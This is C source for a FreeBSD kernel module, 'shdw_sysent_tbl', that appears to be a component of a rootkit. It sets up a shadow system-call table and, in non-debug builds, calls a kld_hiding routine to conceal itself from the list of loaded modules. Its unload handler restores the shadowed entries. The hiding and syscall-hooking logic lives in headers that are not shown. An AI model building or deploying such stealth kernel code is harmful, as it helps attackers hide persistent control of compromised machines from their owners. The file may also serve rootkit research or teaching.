#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/sysproto.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include "kld_hiding.h"
#include "shadow_sysent.h"

#define KLD_NAME T_NAME"_shdw_sysent_tbl"
#define KLD_FILE_NAME T_NAME"_shdw_sysent_tbl.ko"

struct shadow_sysent shadow_sysent[] = {
   {-1, NULL, NULL},
   {-1, NULL, NULL},
   {-1, NULL, NULL},
   {-1, NULL, NULL},
   {-1, NULL, NULL},
   {-1, NULL, NULL},
};

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg)
{
#ifndef DEBUG
   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
#endif
   int error = 0;

   switch (cmd) {
      case MOD_LOAD:
#ifdef DEBUG
         uprintf("[-] shdw_sysent_tbl module loaded at sys call num\n");
#endif
         break;
      case MOD_UNLOAD:
         for (int i = 0; i < MAX_SHADOWS; i++) {
            UNDO_SHADOW_ENTRY(i);
         }
#ifdef DEBUG
         uprintf("[-] shdw_sysent_tbl module unloaded from sys call num\n");
#endif

         break;
      default:
         error = EOPNOTSUPP;
         break;
   }

   return (error);
}

static moduledata_t shdw_sysent_tbl_mod = {
   "shdw_sysent_tbl", /* module name */
   load,              /* event handler */
   NULL
};

MODULE_VERSION(shdw_sysent_tbl, 1);
DECLARE_MODULE(shdw_sysent_tbl, shdw_sysent_tbl_mod, SI_SUB_DRIVERS, SI_ORDER_ANY);
